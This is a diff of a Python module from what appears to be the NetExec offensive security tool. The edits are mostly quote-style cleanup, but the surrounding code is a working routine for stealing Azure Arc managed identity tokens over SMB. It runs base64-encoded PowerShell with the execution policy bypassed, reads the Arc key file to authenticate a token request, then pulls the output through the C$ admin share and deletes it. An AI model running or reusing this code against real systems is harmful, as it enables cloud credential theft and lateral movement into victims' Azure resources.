@@ -3,7 +3,7 @@ from nxc.helpers.misc import CATEGORY
 
 
 class NXCModule:
-    """
+    r"""
     Azure Arc local managed identity token discovery/dump over SMB.
 
     - CHECK: Only verify whether Azure Arc agent is installed (default: False)
@@ -114,10 +114,10 @@ class NXCModule:
             "catch { if ($_.Exception.Response) { $resp1 = $_.Exception.Response; $code = $resp1.StatusCode.value__; $www = $resp1.Headers['WWW-Authenticate']; Write-Log (\"DBG:REQ1_STATUS=\" + $code); Write-Log (\"DBG:REQ1_WWW=\" + $www) } else { Write-Log (\"ERR:REQ1_NO_RESPONSE: \" + $_.Exception.Message); return } }",
             "$path = ($www -split 'Basic realm=')[1].Trim()",
             "if ($path.StartsWith('\"') -and $path.EndsWith('\"')) { $path = $path.Substring(1, $path.Length-2) }",
-            "Write-Log (\"DBG:KEY_PATH=\" + $path)",
-            "if (-not (Test-Path -LiteralPath $path)) { Write-Log (\"ERR:KEY_NOT_FOUND: \" + $path); return }",
+            'Write-Log ("DBG:KEY_PATH=" + $path)',
+            'if (-not (Test-Path -LiteralPath $path)) { Write-Log ("ERR:KEY_NOT_FOUND: " + $path); return }',
             "$basic = Get-Content -LiteralPath $path -Raw",
-            "Write-Log (\"DBG:KEY_LEN=\" + ($basic.Length))",
+            'Write-Log ("DBG:KEY_LEN=" + ($basic.Length))',
             "try { $r2 = Invoke-WebRequest -Method GET -Headers @{ Metadata = 'True'; Authorization = (\"Basic \" + $basic) } -UseBasicParsing -Uri $uri -Verbose:$false; Write-Log (\"DBG:REQ2_STATUS=\" + $r2.StatusCode); $content = $r2.Content; if (-not $content) { Write-Log 'ERR:NO_CONTENT'; return } ; Add-Content -LiteralPath $o -Value $content -Encoding UTF8 }",
             "catch { if ($_.Exception.Response) { $r2 = $_.Exception.Response; $status = $r2.StatusCode.value__; $body = try { $reader = New-Object System.IO.StreamReader($r2.GetResponseStream()); $reader.ReadToEnd() } catch { '' }; Write-Log (\"ERR:REQ2_FAILED_STATUS=\" + $status); if ($body) { Write-Log (\"ERR:REQ2_BODY=\" + $body) } } else { Write-Log (\"ERR:REQ2_EXCEPTION=\" + $_.Exception.Message) } }",
         ])
@@ -126,16 +126,16 @@ class NXCModule:
         context.log.display("Attempting to retrieve Azure Arc Managed Identity access token")
         try:
             # Execute via EncodedCommand for reliable quoting/stdout behavior
-            ps_bytes = ps.encode('utf-16le')
+            ps_bytes = ps.encode("utf-16le")
             ps_b64 = base64.b64encode(ps_bytes).decode()
             command = f"powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {ps_b64}"
             _ = connection.execute(command, True)
             # Read OUTFILE back via SMB; fallback to exec 'type' if needed
             file_out = self._read_outfile_via_smb(connection, context)
             if file_out is None:
-                read_cmd = f"cmd.exe /Q /C type \"{self.outfile}\" && del /F /Q \"{self.outfile}\""
+                read_cmd = f'cmd.exe /Q /C type "{self.outfile}" && del /F /Q "{self.outfile}"'
                 file_out = connection.execute(read_cmd, True)
-            output = (file_out or '').strip()
+            output = (file_out or "").strip()
         except Exception as e:
             context.log.fail(f"Failed to run PowerShell token retrieval: {e}")
             return
@@ -156,18 +156,19 @@ class NXCModule:
         """Try to read the OUTFILE using SMB shares directly and then delete it."""
         try:
             path = self.outfile
-            if len(path) < 3 or path[1] != ':' or path[2] != '\\':
+            if len(path) < 3 or path[1] != ":" or path[2] != "\\":
                 context.log.debug(f"OUTFILE path does not look like absolute Windows path: {path}")
                 return None
-            share = path[0].upper() + '$'
-            rel = path[3:].replace('/', '\\')
-            if not rel.startswith('\\'):
-                rel = '\\' + rel
+            share = path[0].upper() + "$"
+            rel = path[3:].replace("/", "\\")
+            if not rel.startswith("\\"):
+                rel = "\\" + rel
             chunks = []
+
             def _cb(data):
                 chunks.append(data)
             connection.conn.getFile(share, rel, _cb)
-            content = b''.join(chunks).decode('utf-8', errors='replace')
+            content = b"".join(chunks).decode("utf-8", errors="replace")
             try:
                 connection.conn.deleteFile(share, rel)
             except Exception as de:
